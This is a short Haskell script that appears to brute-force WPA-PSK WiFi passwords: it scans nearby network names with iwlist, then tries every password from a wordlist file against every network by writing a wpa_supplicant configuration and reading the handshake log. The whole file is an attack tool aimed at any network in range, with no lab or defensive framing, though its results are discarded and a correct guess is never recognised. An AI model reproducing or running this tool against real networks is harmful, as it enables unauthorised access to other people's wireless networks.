#!/usr/bin/env runhaskell

{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE ExtendedDefaultRules #-}
{-# LANGUAGE NoImplicitPrelude #-}
{-# OPTIONS_GHC -fno-warn-type-defaults #-}

module Main where

import Control.Arrow

import Data.Maybe
import Data.Text
import Data.Text.IO
import Prelude (IO, (.), ($), fmap, Eq (..), Show (..), return, sequence, (>>=), Bool (..), otherwise)
import qualified Prelude (filter, dropWhile, take)
import Shelly
default (Text)

data Status = Right | Wrong | Error | Proceed deriving (Eq, Show)

main :: IO ()
main = do
    runner "ip" ["link", "set", "eno1", "up"]
    networks <- iwlist
    passwords <- (fmap lines) . readFile $ "passwords"

    putStr $ unlines networks

    results <- sequence [ innerLoop network password
                        | network <- networks
                        , password <- passwords
                        ]
    return ()


innerLoop :: Text -> Text -> IO Text
innerLoop network password = conf network password >>= supplicant

runner cmd args = shelly . silently $ run cmd args

iwlist :: IO [Text]
iwlist = fmap parse output
    where
    output :: IO Text
    output = runner "iwlist" ["eno1", "scanning"]

    parse :: Text -> [Text]
    parse = lines
        >>> fmap stripStart
        >>> Prelude.filter (isPrefixOf "ESSID:")
        >>> fmap (drop 6)
        >>> fmap (drop 1 >>> dropEnd 1)

supplicant :: Text -> IO Text
supplicant conf = shelly . (errExit False) $ do
    log <- fmap lines $ run "wpa_supplicant"
        [ "-P", "/run/wpa_supplicant_eno1.pid"
        , "-i", "eno1"
        , "-D", "wext"
        , "-C", "/run/wpa_supplicant"
        , "-c", conf
        ]
    return $ evaluateInput log

    where
    evaluateInput :: [Text] -> Text
    evaluateInput = fmap strategy
        >>> Prelude.take 10
        >>> Prelude.dropWhile (== Proceed)
        >>> listToMaybe
        >>> maybe "No result!" (pack.show)


    strategy :: Text -> Status
    strategy message
        | "4-Way Handshake failed" `isInfixOf` message = Wrong
        | "timed out" `isInfixOf` message = Error
        | "Association request to the driver failed" `isInfixOf` message = Error
        | otherwise = Proceed

conf :: Text -> Text -> IO Text
conf network password = do
    writeFile (unpack conf) text
    return conf
    where
    conf = "/tmp/wifi-bruteforce.tmp"
    text = concat
        [ "ctrl_interface=/run/wpa_supplicant\n"
        , "ctrl_interface_group=wheel\nnetwork={\n    key_mgmt=WPA-PSK\n    psk=\""
        , password
        , "\"\n    ssid=\""
        , network
        , "\"\n}"
        ]


